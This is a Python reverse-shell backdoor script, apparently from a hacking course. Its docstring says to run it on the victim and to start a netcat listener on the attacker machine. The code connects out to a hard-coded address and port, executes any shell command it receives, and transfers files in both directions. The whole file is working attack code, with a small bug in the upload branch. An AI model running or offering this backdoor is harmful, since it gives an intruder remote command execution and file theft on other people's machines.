#!/usr/bin/env python
'''
    RUN THIS PROGRAM ON THE VICTIM
    RUN THE FOLLOWING ON THE HACKER MACHINE
        nc -vv -l -p port_num
        nc -vv -l -p 8080
    NOTE:
        The current ip is the kali ip
        We are running
    IMPORTANT NOTE:
        Problems with python3 version, might want to remove all encode and decodes
        and use python2
'''

import socket
import subprocess
import json
import os
import base64

class Backdoor:
    #Class Attributes
    #   1)connection
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect(("192.168.8.128", 4444))
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)
    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."
    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command_result == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command).decode()
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)


my_backdoor = Backdoor("192.168.8.128", 4444)
my_backdoor.run()